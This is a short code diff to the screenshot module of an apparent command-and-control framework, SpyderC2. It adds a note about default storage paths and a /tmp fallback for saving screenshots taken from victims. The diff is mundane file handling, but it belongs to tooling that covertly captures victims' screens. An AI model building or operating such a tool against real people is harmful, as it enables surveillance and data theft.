@@ -14,7 +14,7 @@ class Screenshot(Module):
 	@classmethod
 	def module_options(cls):
 		h = {
-			'path' : {'desc' : 'Directory on the attacker machine where the files are downloaded. Default is shared/victim_data/<victim_id>', 'required' : False}
+			'path' : {'desc' : 'Directory on the attacker machine where the files are downloaded. Default is shared/victim_data/<victim_id>. NOTE : The default path can be accessed in both docker and host, accessibility of custom path will depend on where you run the program.', 'required' : False}
 		}
 		return h
 
@@ -44,6 +44,14 @@ class Screenshot(Module):
 		## Screenshot is base64 encoded
 		b64encoded_string = data
 		decoded_string = base64.b64decode(b64encoded_string)
+
+		## Check if we have write perms else save to /tmp/SpyderC2
+		if not os.access(os.path.dirname(ss_path), os.W_OK):
+			dump_path = os.path.join('/tmp','SpyderC2',victim_id)
+			print(f"No write access to {os.path.dirname(ss_path)}. Saving to {dump_path}")
+			if not os.path.exists(dump_path):
+				os.makedirs(dump_path,exist_ok=True)
+			ss_path = os.path.join(dump_path,filename)
 
 
 		## Dump the screenshot
